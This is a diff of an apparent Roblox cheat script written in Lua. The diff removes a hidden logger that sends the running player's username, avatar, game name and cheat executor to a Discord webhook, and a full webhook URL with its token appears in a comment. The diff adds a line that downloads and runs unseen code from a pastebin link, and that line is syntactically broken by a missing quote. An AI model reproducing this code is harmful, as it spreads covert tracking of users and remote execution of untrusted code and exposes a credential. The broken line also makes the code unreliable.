@@ -1,36 +1,5 @@
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
- 
-local url =
-   "webhookhere" -- https://discord.com/api/webhooks/985053987558526986/yoYAPZ4qTU4s4QUV8ZiBoQY2dSOjFua6Idslo_gdIYfvXFHGkFAkoy9Au6IgxkRIAAsp
-local data = {
-   ["content"] = "Executed [40 sub special]",
-   ["embeds"] = {
-       {
-           ["title"] = "**Someone Executed [40 SUB SPECIAL]** in: "   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. " :)",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
- 
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef
----------------------------------------------
+loadstring(game:HttpGet("https://pastebin.com/raw/3uumCSX1))()
+
   local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("ImageLabel")
 local Label = Instance.new("TextLabel")
